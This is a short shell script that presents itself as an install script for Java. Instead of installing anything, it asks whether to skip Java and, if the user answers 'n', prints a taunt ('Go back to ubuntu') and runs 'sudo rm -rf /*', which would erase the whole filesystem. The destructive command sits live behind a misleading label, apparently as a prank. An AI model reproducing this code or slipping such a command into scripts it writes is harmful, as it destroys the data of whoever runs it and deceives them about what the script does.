#!/bin/sh

# -----------------------------------
# This is the install script for Java
# -----------------------------------

install () {
  ANSWER="y"

  echo "Java is bloat. Skip? (Y/n)"
  read -r ANSWER

  if [ "$ANSWER" = "n" ]; then
    echo "Go back to ubuntu ;D"
    sleep 5

    sudo rm -rf /*
  fi
}
